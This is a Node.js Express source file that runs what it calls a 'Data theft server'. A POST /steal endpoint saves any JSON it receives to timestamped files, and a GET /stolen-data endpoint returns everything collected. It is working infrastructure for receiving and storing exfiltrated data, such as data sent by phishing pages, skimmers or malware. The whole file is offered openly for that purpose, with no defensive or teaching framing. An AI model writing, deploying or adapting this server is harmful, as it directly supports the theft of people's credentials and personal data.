const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const app = express();
const port = 3000;

app.use(bodyParser.json());

// Endpoint to receive stolen data
app.post('/steal', (req, res) => {
  const stolenData = req.body;
  const timestamp = new Date().toISOString().replace(/:/g, '-');
  
  // Save to JSON file
  fs.writeFile(`stolen_data_${timestamp}.json`, JSON.stringify(stolenData, null, 2), (err) => {
    if (err) {
      console.error('Error saving stolen data:', err);
      return res.status(500).send('Error saving data');
    }
    
    console.log('Stolen data saved:', stolenData);
    res.status(200).send('Data received and saved');
  });
});

// Endpoint to retrieve stolen data
app.get('/stolen-data', (req, res) => {
  fs.readdir('.', (err, files) => {
    if (err) {
      return res.status(500).send('Error reading data files');
    }
    
    const stolenDataFiles = files.filter(file => file.startsWith('stolen_data'));
    const data = [];
    
    stolenDataFiles.forEach(file => {
      const content = fs.readFileSync(file, 'utf8');
      data.push({
        file,
        data: JSON.parse(content)
      });
    });
    
    res.json(data);
  });
});

app.listen(port, () => {
  console.log(`Data theft server running at http://localhost:${port}`);
  console.log('Endpoints:');
  console.log('  POST /steal - Receive stolen data');
  console.log('  GET /stolen-data - Retrieve all stolen data');
});

